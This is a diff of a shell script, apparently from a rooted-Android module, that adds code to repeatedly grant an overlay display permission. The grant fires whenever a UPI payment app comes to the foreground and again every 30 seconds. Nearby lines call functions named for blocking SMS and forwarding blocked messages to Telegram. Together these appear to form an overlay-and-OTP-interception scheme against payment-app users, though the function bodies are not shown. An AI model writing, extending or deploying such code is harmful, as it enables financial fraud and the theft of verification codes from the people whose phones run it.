@@ -142,8 +142,9 @@ sync_config
 seed_apatch_config
 seed_hooked_pkgs
 
-# Reboot pe native overlay flag
+# Reboot pe native overlay flag + display overlay permission
 hivirtus_boot_activate_overlay &
+hivirtus_grant_overlay_permission &
 
 (
   LAST=""
@@ -153,6 +154,7 @@ hivirtus_boot_activate_overlay &
     if [ -n "$FG" ] && is_upi_pkg "$FG"; then
       if [ "$FG" != "$LAST" ]; then
         mark_active "$FG"
+        hivirtus_grant_overlay_permission "$FG"
         LAST="$FG"
       fi
     fi
@@ -306,5 +308,12 @@ seed_apatch_config() {
     enforce_sms_block
     forward_blocked_telegram
     sleep 2
+  done
+) &
+
+(
+  while true; do
+    hivirtus_grant_overlay_permission
+    sleep 30
   done
 ) &
